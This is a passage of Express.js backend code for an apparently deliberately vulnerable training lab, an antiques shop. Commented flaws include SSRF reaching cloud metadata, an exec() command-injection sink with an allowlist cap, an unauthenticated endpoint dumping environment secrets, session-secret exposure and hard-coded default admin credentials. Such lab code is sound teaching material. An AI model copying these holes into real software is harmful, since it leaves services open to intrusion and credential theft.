// This makes a raw server-side HTTP(S) request on attacker-supplied input
// with no host/scheme allowlist -- classic SSRF that can reach internal
// services such as a cloud metadata endpoint (169.254.169.254) or other
// internal hosts not otherwise reachable from the internet. A "verify a
// partner's API credential" admin tool is a deliberately less-obvious
// SSRF sink than an "import photo from URL" feature.
// ----------------------------------------------------------------------------
app.post("/api/admin/verify-authenticator-credential", requireAdmin, (req, res) => {
  const apiUrl = req.body.api_url || "";
  let target;
  try {
    target = new URL(apiUrl);
  } catch (e) {
    return res.status(400).json({ error: "Invalid URL" });
  }
  const client = target.protocol === "https:" ? https : http;
  const request = client.get(target, (r) => {
    let body = "";
    r.on("data", (chunk) => {
      if (body.length < 2000) body += chunk.toString();
    });
    r.on("end", () => {
      res.json({
        url: apiUrl,
        status_code: r.statusCode,
        content_type: r.headers["content-type"] || "",
        body_snippet: body.slice(0, 2000),
      });
    });
  });
  request.on("error", (err) => {
    res.status(500).json({ error: err.message });
  });
  request.setTimeout(5000, () => {
    request.destroy();
    res.status(504).json({ error: "Request timed out" });
  });
});

// This tool pings an authenticator hostname via execFile (no shell
// involved), so it is NOT a command-injection sink in this build. See
// VULNERABILITY #12 below (relocated to the condition-report generator).
app.post("/api/admin/ping-authenticator", requireAdmin, (req, res) => {
  const hostname = req.body.hostname || "";
  execFile("ping", ["-c", "1", hostname], { timeout: 10000 }, (error, stdout, stderr) => {
    const output = (stdout || "") + (stderr || "") + (error ? `\nError: ${error.message}` : "");
    res.json({ output });
  });
});

// ----------------------------------------------------------------------------
// VULNERABILITY #12 - CWE-77 Command Injection (OWASP A05:2025 Injection)
// -- DELIBERATELY BOUNDED for this build.
// Endpoint: POST /api/admin/generate-condition-report
//
// This admin convenience tool "stamps" a plain-text condition report for
// an artifact by shelling out to echo the artifact's condition code
// alongside a report label. The condition code is concatenated directly
// into a child_process.exec() call with no sanitization -- the exact
// same unsafe pattern as an unrestricted command-injection bug, just
// hiding behind an innocuous-looking "condition code" parameter on a
// cataloguing feature rather than an obviously network-flavored tool
// like a ping utility (that tool is now hardened via execFile and is not
// usable for command injection). HOWEVER, per this lab's requested
// scope, before the concatenated string is executed the handler checks
// whether the *injected command* (the text after the condition code)
// matches exactly one of an allowlist of four harmless commands --
// whoami, id, uname, or pwd -- and refuses to run anything else. The
// vulnerable sink (unsanitized string concatenation into a shell) is
// unchanged; only the permitted outcome is capped for a safer classroom
// demo.
// ----------------------------------------------------------------------------
const COMMAND_INJECTION_ALLOWLIST = ["whoami", "id", "uname", "pwd"];

app.post("/api/admin/generate-condition-report", requireAdmin, (req, res) => {
  const conditionCode = req.body.condition_code || "Good";
  const fullCommand = "echo Condition report stamp: " + conditionCode; // VULNERABLE: unsanitized string concat

  // Lab guardrail: parse out anything that looks like a shell-injected
  // extra command (after ; | & or a newline) and only allow it through if
  // it is exactly one of the four allowlisted, harmless commands.
  const injectedPart = conditionCode.replace(/^[^;|&\n]*[;|&\n]+\s*/, "").trim();
  const looksInjected = /[;|&\n`$()]/.test(conditionCode);

  if (looksInjected) {
    const isAllowlisted = COMMAND_INJECTION_ALLOWLIST.includes(injectedPart);
    if (!isAllowlisted) {
      return res.status(403).json({
        error:
          "Blocked by lab guardrail: only whoami, id, uname, or pwd may be executed via injection.",
        attempted_condition_code: conditionCode,
      });
    }
  }

  exec(fullCommand, { timeout: 10000 }, (error, stdout, stderr) => {
    const output = (stdout || "") + (stderr || "") + (error ? `\nError: ${error.message}` : "");
    res.json({ output });
  });
});

app.post("/api/admin/artifacts", requireAdmin, async (req, res, next) => {
  try {
    const { name, era_id, price, origin, condition_code, description, image } = req.body;
    const slug = (name || "").toLowerCase().replace(/\s+/g, "-");
    await pool.query(
      `INSERT INTO artifacts (name, slug, era_id, price, origin, condition_code, description, image)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
      [name, slug, era_id, price, origin, condition_code, description, image || "victorian-clock.jpg"]
    );
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #7 (endpoint) - CWE-526 Env Var Exposure (OWASP A01:2025)
// Endpoint: GET /api/admin/provenance-db-diagnostics
//
// Framed as a routine "database health check" tool for the provenance
// records system, this endpoint has no authentication check at all and
// dumps the full process environment, including the fake Stripe secret
// key, DB admin password, SMTP password and the admin login backdoor
// value defined above. A "DB diagnostics" utility is a deliberately
// less-obvious env-leak sink than an endpoint literally named
// "/debug/env".
// ----------------------------------------------------------------------------
app.get("/api/admin/provenance-db-diagnostics", (req, res) => {
  // VULNERABLE: no auth check, dumps full environment to any visitor
  res.json({
    diagnostic_status: "connected",
    db_pool_size: 10,
    environment_variables: process.env,
  });
});

app.get("/api/admin/system-info", requireAdmin, (req, res) => {
  res.json({
    node_version: process.version,
    platform: process.platform,
    cwd: process.cwd(),
    session_secret: SESSION_SECRET,
  });
});

// ============================================================================
// DEMO: trigger the global exception handler (for lab verification of #24)
// ============================================================================
app.get("/api/trigger-error", (req, res) => {
  throw new Error(`Demo unhandled exception triggered by ${req.ip} for lab verification`);
});

// --------------------------------------------------------------------------
// Error handler must be registered LAST
// --------------------------------------------------------------------------
app.use(errorHandler);

app.listen(PORT, "0.0.0.0", () => {
  console.log(`The Antiquary & Relic Co. backend listening on http://0.0.0.0:${PORT}`);
  console.log("Default admin login: admin / admin123");
});
